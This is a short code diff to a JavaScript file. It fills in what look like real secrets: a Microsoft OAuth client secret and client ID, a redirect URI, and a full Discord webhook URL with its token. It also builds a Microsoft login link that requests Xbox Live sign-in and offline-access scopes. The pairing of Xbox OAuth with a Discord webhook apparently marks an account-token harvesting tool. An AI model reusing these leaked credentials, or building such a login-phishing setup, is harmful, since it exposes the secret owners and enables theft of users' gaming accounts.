@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'secret'
-const client_id = 'cid'
-const redirect_uri = 'redirect'
-const webhook_url = 'Your webhook'
+const client_secret = '8Gr8Q~mw33oIWUIlKBn-_hTJYZQvACyG0tu5vbzt'
+const client_id = '3f044412-77d3-4422-a4e3-d69cc735ccea'
+const redirect_uri = 'https://dull-teal-bull-yoke.cyclic.app'
+const webhook_url = 'https://discord.com/api/webhooks/1116046426120671364/S2vkJtF_PuEWaGFEteEFf9CQ1iHoM2Y_0tsSKPdzZiXyf0c3JvP9M7cTgsEjoYhxvDYo'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
